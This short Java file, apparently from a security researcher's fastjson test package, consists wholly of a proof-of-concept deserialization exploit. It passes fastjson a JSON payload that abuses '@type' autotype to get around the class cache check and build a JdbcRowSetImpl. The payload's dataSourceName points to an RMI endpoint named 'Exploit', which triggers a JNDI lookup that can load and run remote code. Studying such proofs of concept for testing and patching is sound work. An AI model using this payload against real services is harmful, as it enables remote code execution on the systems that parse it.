
package cn.org.javaweb.fastjsontest;

import com.alibaba.fastjson.JSON;

/**
 * @author Lei Wang
 */
public class test5 {

    public static void main(String[] argv) {
        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"xxxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
                "\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}}";
        JSON.parse(payload);
    }

}